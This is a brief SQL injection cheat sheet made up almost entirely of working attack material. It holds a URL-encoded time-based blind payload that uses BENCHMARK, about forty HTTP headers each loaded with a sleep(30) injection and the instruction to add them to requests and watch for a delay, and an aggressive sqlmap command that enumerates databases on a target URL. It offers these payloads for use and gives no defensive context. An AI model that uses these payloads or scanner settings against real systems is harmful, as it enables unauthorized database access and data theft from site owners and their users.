# SQLi Payloads


```
%22)%20AND%201337%3dBENCHMARK(5000000,MD5(0x774c5341))%20AND%20(%221337%22%20LIKE%20%221337
```

```
ADD THESE HEADERS TO YOUR WEB REQUESTS
 
If the SQL injection works, there will be a 30sec delay between the request and response!
 
HEADERS: 
Accept: "' or sleep(30)='"
Accept-Charset: "' or sleep(30)='"
Accept-Datetime: "' or sleep(30)='"
Accept-Encoding: "' or sleep(30)='"
Accept-Language: "' or sleep(30)='"
Authorization: "' or sleep(30)='"
Cache-Control: "' or sleep(30)='"
Connection: "' or sleep(30)='"
Content-Length: "' or sleep(30)='"
Content-MD5: "' or sleep(30)='"
Content-Type: "' or sleep(30)='"
Cookie: "' or sleep(30)='"
Date: "' or sleep(30)='"
Expect: "' or sleep(30)='"
Forwarded: "' or sleep(30)='"
From: "' or sleep(30)='"
If-Match: "' or sleep(30)='"
If-Modified-Since: "' or sleep(30)='"
If-None-Match: "' or sleep(30)='"
If-Range: "' or sleep(30)='"
If-Unmodified-Since: "' or sleep(30)='"
Max-Forwards: "' or sleep(30)='"
Origin: "' or sleep(30)='"
Pragma: "' or sleep(30)='"
Proxy-Authorization: "' or sleep(30)='"
Range: "' or sleep(30)='"
Referer: "' or sleep(30)='"
TE: "' or sleep(30)='"
Upgrade: "' or sleep(30)='"
User-Agent: "' or sleep(30)='"
Via: "' or sleep(30)='"
Warning: "' or sleep(30)='"
X-Client-IP: "' or sleep(30)='"
X-Remote-IP: "' or sleep(30)='"
X-Remote-Addr: "' or sleep(30)='"
X-Forwarded-For: "' or sleep(30)='"
X-Originating-IP: "' or sleep(30)='"
X-Host: "' or sleep(30)='"
X-Forwarded-Host: "' or sleep(30)='"
```


```
sqlmap -u "https://www[.]example[.]com/something/thing/filter-thing.php?vulnerable-param=123& another-param=123" --dbs --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
```

```
--dbs --level=5 --risk=3 --random-agent --user-agent -v3 
```

```
--batch --threads=10 --dbs
```

